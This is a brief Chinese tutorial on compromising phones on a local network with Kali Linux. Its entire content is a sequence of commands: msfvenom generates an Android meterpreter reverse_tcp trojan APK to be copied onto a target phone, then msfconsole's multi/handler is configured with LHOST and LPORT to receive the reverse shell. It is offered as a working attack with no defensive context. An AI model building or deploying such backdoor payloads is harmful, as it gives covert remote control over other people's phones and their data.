利用Kali入侵局域网的手机

  • 生成木马病毒（将生成的apk文件拷贝到手机）
msfvenom -p android/meterpreter/reverse_tcp LHOST=*.*.*.*(本地IP) LPORT=*(本地端口) -o *(输出目录)
  • 启动postgresql数据库
service postgresql start
  • 启动msfconsole
msfconsole
  • 使用探测句柄
use exploit/multi/handler
  • 设置payload
set payload android/meterpreter/reverse_tcp
  • 设置本地IP
set LHOST=*.*.*.*
  • 设置本地端口
set LPORT=*
  • 进行探测
exploit
  • 查看可执行的命令
help
